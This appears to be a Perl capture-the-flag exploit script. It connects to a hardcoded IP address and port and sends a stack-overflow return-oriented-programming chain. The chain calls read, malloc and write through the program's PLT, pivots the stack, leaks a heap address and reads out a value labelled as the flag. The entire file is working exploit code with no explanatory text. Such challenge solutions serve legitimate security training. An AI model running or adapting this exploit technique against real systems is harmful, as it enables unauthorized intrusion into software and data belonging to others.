#!/usr/bin/perl                                                                                                                                                                    

use strict;
use warnings;

use IO::Socket::INET;

my ($r, $stack);
my $sock = IO::Socket::INET->new(
    PeerAddr => '23.23.190.205',
    PeerPort => 8976,
    Proto => 'tcp');

die "Can't connect : $!\n" unless $sock;

my $payload = 'A'x100;

$payload .= pack('L', 0x080483d0); # read@plt                                                                                                                                      
$payload .= pack('L', 0x080486a7); # pop3;ret                                                                                                                                      
$payload .= pack('L', 0x00000000); # stdin                                                                                                                                         
$payload .= pack('L', 0x080498d8); # DATA                                                                                                                                          
$payload .= pack('L', 4); # size                                                                                                                                                   

$payload .= pack('L', 0x080483f0); # malloc@plt                                                                                                                                    
$payload .= pack('L', 0x080483a0); # pop;ret                                                                                                                                       
$payload .= pack('L', 0x100); # size                                                                                                                                               

$payload .= pack('L', 0x080483a0); # pop ebx; ret                                                                                                                                  
$payload .= pack('L', 0x080498d8-0x5d5b04c4); # DATA                                                                                                                               

$payload .= pack('L', 0x080484de); # add [ebx+0x5d5b04c4],eax                                                                                                                      

$payload .= pack('L', 0x08048440); # write@plt                                                                                                                                     
$payload .= pack('L', 0x080486a7); # pop3;ret                                                                                                                                      
$payload .= pack('L', 0x00000001); # stdout                                                                                                                                        
$payload .= pack('L', 0x080498d8); # DATA                                                                                                                                          
$payload .= pack('L', 4); # size                                                                                                                                                   

$payload .= pack('L', 0x080483d0); # read@plt                                                                                                                                      
$payload .= pack('L', 0x080486a7); # pop3;ret                                                                                                                                      
$payload .= pack('L', 0x00000000); # stdin                                                                                                                                         
$payload .= pack('L', 0x080498d8); # DATA                                                                                                                                          
$payload .= pack('L', 0x130); # size                                                                                                                                               

$payload .= pack('L', 0x080484e3); # pop ebp ; ret                                                                                                                                 
$payload .= pack('L', 0x080498d4);
$payload .= pack('L', 0x08048511); # leave; ret                                                                                                                                    

print $sock $payload;

sleep 1;
print $sock "\x00\x00\x00\x00";
sleep 1;

$sock->read($r, 21);
$sock->read($r, 4);

$r = unpack('L', $r);

$stack .= pack('L', 0x08048440); # write@plt                                                                                                                                       
$stack .= pack('L', 0x080486a7); # pop3;ret                                                                                                                                        
$stack .= pack('L', 0x00000001); # stdout                                                                                                                                          
$stack .= pack('L', $r-0x48); # FLAG                                                                                                                                               
$stack .= pack('L', 100); # size                                                                                                                                                   

print $sock $stack;
sleep 1;

while($r = <$sock>) {
    print $r;
}

